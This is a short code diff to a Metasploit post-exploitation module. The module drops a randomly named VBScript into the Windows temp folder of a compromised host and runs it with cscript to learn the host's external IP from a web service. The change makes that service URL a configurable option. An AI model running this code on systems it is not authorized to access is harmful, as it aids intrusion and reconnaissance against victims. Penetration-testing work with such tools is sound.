@@ -23,11 +23,15 @@ class Metasploit3 < Msf::Post
 				[ 'URL', 'http://superuser.com/questions/165986/windows-command-that-returns-external-ip' ]
 			]
 		))
+		register_options(
+		[
+			OptString.new('SERVICE', [true, 'Website.', 'http://icanhazip.com'])
+		], self.class)
 	end
 
 
 	def run
-		vbs_file = create_vbs
+		vbs_file = create_vbs(datastore['SERVICE'])
 		return if vbs_file.nil?
 
 		output = cmd_exec("cscript",vbs_file)
@@ -38,13 +42,13 @@ class Metasploit3 < Msf::Post
 	end
 
 
-	def create_vbs
+	def create_vbs(service)
 		vbs_dir = expand_path("%TEMP%")
 		vbs_file = vbs_dir << "\\" << Rex::Text.rand_text_alpha((rand(8)+6)) << ".vbs"
 
 		conf_conn =  "Dim msf\r\n"
 		conf_conn += "Set msf = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
-		conf_conn += "msf.open \"GET\", \"http://icanhazip.com\", False\r\n"
+		conf_conn += "msf.open \"GET\", \"#{service}\", False\r\n"
 		conf_conn += "msf.send\r\n"
 		conf_conn += "WScript.StdOut.Write msf.responseText\r\n"
 
